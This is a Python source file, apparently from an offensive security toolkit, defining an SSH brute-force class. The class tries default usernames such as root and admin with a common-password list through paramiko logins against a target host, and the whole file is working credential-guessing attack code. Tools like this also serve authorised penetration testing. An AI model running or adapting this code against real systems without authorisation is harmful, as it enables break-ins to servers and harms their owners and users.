
import asyncio

from ...payloads.base import Credentials, WordlistManager
from .base import BruteForceBase


class SSHBruteForce(BruteForceBase):

    def __init__(self, host: str, port: int = 22, **kwargs):
        super().__init__(host, port, **kwargs)
        self._client = None

    def get_default_username_list(self) -> list[str]:
        return ['root', 'admin', 'user', 'test', 'ubuntu', 'debian', 'oracle', 'postgres', 'mysql', 'git']

    def get_default_password_list(self) -> list[str]:
        return WordlistManager.get_wordlist('common_passwords') or [
            'password',
            '123456',
            'admin',
            'root',
            'toor',
            'passw0rd',
            'P@ssw0rd',
            '12345678',
        ]

    async def try_credentials(self, credentials: Credentials) -> bool:

        def _try_sync():
            try:
                import paramiko
            except ImportError:
                return False

            client = paramiko.SSHClient()
            try:
                client.connect(
                    hostname=self.host,
                    port=self.port,
                    username=credentials.username,
                    password=credentials.password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False,
                )
                client.close()
                return True
            except (paramiko.AuthenticationException, paramiko.SSHException):
                return False
            except OSError:
                return False
            finally:
                try:
                    client.close()
                except OSError:
                    pass


        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, _try_sync)
